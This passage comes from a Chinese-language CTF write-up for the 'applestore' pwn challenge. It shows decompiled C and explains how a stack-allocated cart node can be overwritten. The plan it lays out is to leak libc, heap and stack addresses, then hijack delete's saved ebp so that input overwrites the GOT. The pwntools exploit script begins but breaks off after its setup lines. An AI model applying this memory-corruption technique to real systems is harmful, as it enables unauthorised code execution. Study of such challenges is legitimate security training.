</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">add</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-2Ch]
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">nptr</span><span class="p">[</span><span class="mi">22</span><span class="p">];</span> <span class="c1">// [esp+26h] [ebp-22h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+3Ch] [ebp-Ch]
</span><span class="c1"></span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Device Number&gt; &#34;</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">my_read</span><span class="p">(</span><span class="n">nptr</span><span class="p">,</span> <span class="mh">0x15u</span><span class="p">);</span>
  <span class="k">switch</span> <span class="p">(</span> <span class="n">atoi</span><span class="p">(</span><span class="n">nptr</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
      <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">create</span><span class="p">(</span><span class="s">&#34;iPhone 6&#34;</span><span class="p">,</span> <span class="mi">199</span><span class="p">);</span>
      <span class="n">insert</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
      <span class="k">goto</span> <span class="n">LABEL_8</span><span class="p">;</span>
    <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
      <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">create</span><span class="p">(</span><span class="s">&#34;iPhone 6 Plus&#34;</span><span class="p">,</span> <span class="mi">299</span><span class="p">);</span>
      <span class="n">insert</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
      <span class="k">goto</span> <span class="n">LABEL_8</span><span class="p">;</span>
    <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
      <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">create</span><span class="p">(</span><span class="s">&#34;iPad Air 2&#34;</span><span class="p">,</span> <span class="mi">499</span><span class="p">);</span>
      <span class="n">insert</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
      <span class="k">goto</span> <span class="n">LABEL_8</span><span class="p">;</span>
    <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
      <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">create</span><span class="p">(</span><span class="s">&#34;iPad Mini 3&#34;</span><span class="p">,</span> <span class="mi">399</span><span class="p">);</span>
      <span class="n">insert</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
      <span class="k">goto</span> <span class="n">LABEL_8</span><span class="p">;</span>
    <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
      <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">create</span><span class="p">(</span><span class="s">&#34;iPod Touch&#34;</span><span class="p">,</span> <span class="mi">199</span><span class="p">);</span>
      <span class="n">insert</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
<span class="nl">LABEL_8</span><span class="p">:</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You&#39;ve put *%s* in your shopping cart.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">v1</span><span class="p">);</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Brilliant! That&#39;s an amazing idea.&#34;</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">default</span><span class="o">:</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Stop doing that. Idiot!&#34;</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>create</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="o">**</span><span class="kr">__cdecl</span> <span class="nf">create</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">**</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-Ch]
</span><span class="c1"></span>
  <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10u</span><span class="p">);</span>
  <span class="n">v3</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
  <span class="n">asprintf</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
  <span class="n">v3</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v3</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>申请了0x10大小的空间，使用<code>asprintf</code>申请商品名称所占用大小的内存空间，并返回指针。<code>asprintf</code>所申请的内存空间需要手动释放。在32位程序下，一个指针占4字节，紧接着的四个字节放入了商品的价格，<code>int</code>类型也是四个字节，其余的0x8字节都置位0。</p>
<p><strong>insert</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">insert</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span><span class="c1"></span>  <span class="n">_DWORD</span> <span class="o">*</span><span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-4h]
</span><span class="c1"></span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">myCart</span><span class="p">;</span> <span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="p">)</span>
    <span class="p">;</span>
  <span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>0x10的空间在<code>create</code>的时候只使用了0x8，在<code>insert</code>中，首先是一个循环，这个循环是用来遍历链表的。在初始时，<code>myCart</code>为空，直接跳出了循环，之后在其+8的位置放入了将插入的商品的地址，又在商品内存的+12的位置插入了<code>myCart</code>的地址。</p>
<p>到这里就很清晰了，程序使用了一个双向链表来管理商品，其内存布局如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="o">|</span><span class="n">chunk</span> <span class="n">head</span>	<span class="o">|</span>
<span class="o">|</span><span class="n">name_addr</span>	<span class="o">|</span>	<span class="o">+</span><span class="mi">0</span>
<span class="o">|</span><span class="n">price</span>		<span class="o">|</span>	<span class="o">+</span><span class="mi">4</span>
<span class="o">|</span><span class="n">fd</span>			<span class="o">|</span>	<span class="o">+</span><span class="mi">8</span>
<span class="o">|</span><span class="n">bk</span>			<span class="o">|</span>	<span class="o">+</span><span class="mi">12</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>delete</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">delete</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+10h] [ebp-38h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [esp+14h] [ebp-34h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+18h] [ebp-30h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-2Ch]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+20h] [ebp-28h]
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">nptr</span><span class="p">[</span><span class="mi">22</span><span class="p">];</span> <span class="c1">// [esp+26h] [ebp-22h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [esp+3Ch] [ebp-Ch]
</span><span class="c1"></span>
  <span class="n">v7</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">dword_804B070</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Item Number&gt; &#34;</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">my_read</span><span class="p">(</span><span class="n">nptr</span><span class="p">,</span> <span class="mh">0x15u</span><span class="p">);</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">nptr</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">v2</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="n">v3</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
      <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Remove %d:%s from your shopping cart.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">v2</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v7</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">++</span><span class="n">v1</span><span class="p">;</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v7</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>删除函数，根据商品的序号将商品从链表中删除，指针的更新也很简单：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
<span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>checkout</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">checkout</span><span class="p">(){</span>  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+10h] [ebp-28h]  char *v2[5]; // [esp+18h] [ebp-20h] BYREF  unsigned int v3; // [esp+2Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  v1 = cart();  if ( v1 == 7174 )  {    puts(&#34;*: iPhone 8 - $1&#34;);    asprintf(v2, &#34;%s&#34;, &#34;iPhone 8&#34;);    v2[1] = (char *)1;		//v2 is in the stack !!!    insert((int)v2);    v1 = 7175;  }  printf(&#34;Total: $%d\n&#34;, v1);  puts(&#34;Want to checkout? Maybe next time!&#34;);  return __readgsdword(0x14u) ^ v3;}
</span></code></pre></td></tr></table>
</div>
</div><p>当商品的总价格为7174时，就会将<code>iPhone 8</code>加入链表。</p>
<p>这里注意<code>iPhone 8</code>的内存空间是在栈上的！<code>v2</code>变量在<code>ebp-0x20</code>的位置，这点很重要。</p>
<p>我们知道，在调用函数时，调用者会将被调函数的参数压栈，之后保存栈底的位置，即<code>ebp</code>。在被调函数返回时，并没有对栈进行清空，只是恢复了栈的位置。而其他被调函数还有可能会使用栈上的这个数据。那么如果我们通过一些手段修改了这个数据，就可能造成攻击，看<code>headler</code>的函数调用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">.text:08048C33 loc_8048C33:                            ; CODE XREF: handler+5E↑j.text:08048C33                                         ; DATA XREF: .rodata:jpt_8048C31↓o.text:08048C33                 call    list            ; jumptable 08048C31 case 1.text:08048C38                 jmp     short loc_8048C63.text:08048C3A ; ---------------------------------------------------------------------------.text:08048C3A.text:08048C3A loc_8048C3A:                            ; CODE XREF: handler+5E↑j.text:08048C3A                                         ; DATA XREF: .rodata:jpt_8048C31↓o.text:08048C3A                 call    add             ; jumptable 08048C31 case 2.text:08048C3F                 jmp     short loc_8048C63.text:08048C41 ; ---------------------------------------------------------------------------.text:08048C41.text:08048C41 loc_8048C41:                            ; CODE XREF: handler+5E↑j.text:08048C41                                         ; DATA XREF: .rodata:jpt_8048C31↓o.text:08048C41                 call    delete          ; jumptable 08048C31 case 3.text:08048C46                 jmp     short loc_8048C63.text:08048C48 ; ---------------------------------------------------------------------------.text:08048C48.text:08048C48 loc_8048C48:                            ; CODE XREF: handler+5E↑j.text:08048C48                                         ; DATA XREF: .rodata:jpt_8048C31↓o.text:08048C48                 call    cart            ; jumptable 08048C31 case 4.text:08048C4D                 jmp     short loc_8048C63.text:08048C4F ; ---------------------------------------------------------------------------.text:08048C4F.text:08048C4F loc_8048C4F:                            ; CODE XREF: handler+5E↑j.text:08048C4F                                         ; DATA XREF: .rodata:jpt_8048C31↓o.text:08048C4F                 call    checkout        ; jumptable 08048C31 case 5.text:08048C54                 jmp     short loc_8048C63
</code></pre></td></tr></table>
</div>
</div><p>这里只是一个一个的<code>call</code>操作，没有对栈进行其他的处理，所以栈上的<code>v2</code>相对于这些函数的<code>ebp</code>而言偏移是相同的。</p>
<p>那么我们如何覆写这块内存呢？</p>
<p>请看在这些函数读取操作的时候：</p>
<p><strong>cart</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">cart</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [esp+18h] [ebp-30h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-2Ch]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+20h] [ebp-28h]
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">22</span><span class="p">];</span> <span class="c1">// [esp+26h] [ebp-22h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+3Ch] [ebp-Ch]
</span><span class="c1"></span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Let me check your cart. ok? (y/n) &gt; &#34;</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">my_read</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x15u</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">121</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;==== Cart ====&#34;</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">dword_804B070</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v0</span> <span class="o">=</span> <span class="n">v2</span><span class="o">++</span><span class="p">;</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d: %s - $%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v0</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">i</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">));</span>
      <span class="n">v3</span> <span class="o">+=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>这里<code>buf</code>距离<code>ebp</code>0x22字节，<code>iPhone 8</code>字符串在<code>ebp-20</code>的位置，而<code>buf</code>允许写入0x15字节，到这里你应该就想到如何覆写了。我们在前两个字节写入选项，在后面覆写构造<code>iPhone 8</code>的内存结构。</p>
<p>首先，我们将字符串地址覆写为某got表地址，那么调用<code>cart</code>就可以leak libc。在遍历链表的时候只根据<code>fd</code>指针，所以我们将fd覆写为<code>myCart+8</code>的地址就可以再次泄露heap地址，而heap上其实是保存着栈的地址的。也可以通过使用libc中的environ进行泄露。</p>
<p>接着，我们可以通过<code>delete</code>来实现任意地址写。这里有一个问题，got表地址被写入后，会被当作商品的指针，而实际上got表指向的是代码段，这个段是不可写的！所以，我们无法通过简单的填写指针来进行got表劫持。</p>
<p>这里，我们通过劫持<code>delete</code>的ebp，在函数中，局部变量的寻址一般是通过<code>ebp-offset</code>实现的，所以，我们通过劫持<code>ebp</code>到got表，在输入变量的时候就可以对got表进行覆写。</p>
<p>接着我们要做的就是覆写劫持<code>delete</code>的ebp，写入<code>atoi_got+0x22</code>。因为允许我们输入的变量相对于<code>ebp</code>的偏移为0x22。参考上面<code>delete</code>的等价操作，只要简单的覆写<code>fd</code>和<code>bk</code>即可。</p>
<h2 id="exp-1">exp</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">leak</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span><span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">{0}</span><span class="s1"> addr ---&gt; </span><span class="si">{1}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>

<span class="n">binary</span><span class="o">=</span><span class="s1">&#39;./applestore&#39;</span>
<span class="c1">#gdb.attach(sh)</span>
<span class="k">if</span> <span class="s1">&#39;g&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;DEBUG&#34;</span>
